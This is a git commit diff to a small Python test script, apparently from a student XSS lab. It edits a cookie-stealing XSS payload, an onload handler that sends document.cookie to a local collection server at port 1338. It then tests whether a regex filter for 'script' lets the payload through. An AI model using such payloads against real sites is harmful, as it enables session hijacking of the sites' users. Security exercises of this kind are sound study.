86cb59525d7f3abaa1e211eab0983485c2e3f8a4
Ed Shao <ss5902@columbia.edu>
2019-11-10 16:22:50 -0500

    commit m

--- test.py
+++ test.py
@@ -1,6 +1,6 @@
 import re
 
-comment = '<BODY ONLOAD=window.open("http://127.0.0.1:1338/xss/medium?cookie=" + document.cookie)>'
+comment = '<BODY ONLOAD=window.location="http://127.0.0.1:1338/xss/medium?cookie=" + document.cookie>'
 print(comment)
 comment = re.sub(r'<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t', '', comment, flags=re.IGNORECASE)
 print(comment)
